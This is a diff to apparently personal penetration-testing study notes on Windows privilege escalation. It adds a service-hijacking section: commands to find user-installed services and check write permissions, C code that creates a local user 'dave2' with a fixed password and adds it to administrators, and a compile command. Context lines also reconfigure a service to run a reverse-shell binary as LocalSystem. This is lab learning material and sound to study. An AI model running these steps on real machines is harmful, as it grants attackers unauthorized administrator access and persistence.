@@ -70,6 +70,33 @@
      accesschk64.exe -qlc xxx
      //generate reversehll file , grant privi,modify config of service 
      sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem  // localsystem is high privi of a local host.
+
+  #### Service Hijacking
+  //check all services.  binaries are located in the C:\xampp\ directory instead of C:\Windows\System32 means installed by user
+  `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+
+  //check privi, replace the exe file to add user of admin
+  `icacls "C:\xampp\apache\bin\httpd.exe"`
+  //If have write privi
+```
+      #include <stdlib.h>
+    
+    int main ()
+    {
+      int i;
+      
+      i = system ("net user dave2 password123! /add");
+      i = system ("net localgroup administrators dave2 /add");
+      
+      return 0;
+    }
+```
+//compile it
+`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+
+`net stop mysql`
+
+
   #### Windows Privileges - SeBackup / SeRestore
     whoami /priv
       SeBackupPrivilege             Back up files and directories  Disabled
